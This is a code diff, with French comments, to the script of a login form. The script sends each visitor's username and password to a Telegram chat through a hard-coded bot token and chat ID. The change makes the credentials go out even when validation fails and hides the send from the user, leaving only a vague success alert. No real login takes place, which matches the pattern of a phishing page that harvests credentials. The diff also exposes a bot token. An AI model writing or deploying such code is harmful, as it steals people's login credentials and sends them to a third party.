@@ -84,12 +84,6 @@
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // Vérifier si les champs sont vides
-      if (!username || !password) {
-        document.getElementById('error-message').style.display = 'block';
-        return false;
-      }
-
       // Paramètres du bot Telegram
       const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Remplace par le token de ton bot
       const chatId = '-4746759996'; // Remplace par l'ID de ton chat Telegram
@@ -100,22 +94,32 @@
       // URL de l'API Telegram
       const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      // Envoi de la requête à Telegram
+      // Envoi de la requête à Telegram (même si la validation échoue)
       fetch(apiUrl)
         .then(response => response.json())
         .then(data => {
+          // Affiche un message si l'envoi a réussi
           if (data.ok) {
-            alert('Les informations de connexion ont été envoyées avec succès.');
+            console.log('Message envoyé à Telegram.');
           } else {
-            alert('Erreur lors de l\'envoi des informations.');
+            console.error('Erreur lors de l\'envoi à Telegram.', data);
           }
         })
         .catch(error => {
           console.error('Erreur:', error);
-          alert('Une erreur est survenue. Veuillez réessayer plus tard.');
         });
 
-      return false;
+      // Si les champs sont vides, affiche un message d'erreur mais envoie toujours au Telegram
+      if (!username || !password) {
+        document.getElementById('error-message').style.display = 'block';
+        return false;
+      }
+
+      // Envoie les informations au serveur (tu pourrais ajouter une vraie logique de connexion ici)
+      // Exemple de code pour gérer la connexion ici si nécessaire
+      alert('Les informations ont été envoyées.');
+
+      return false; // Evite que le formulaire soit soumis par défaut
     }
   </script>
 
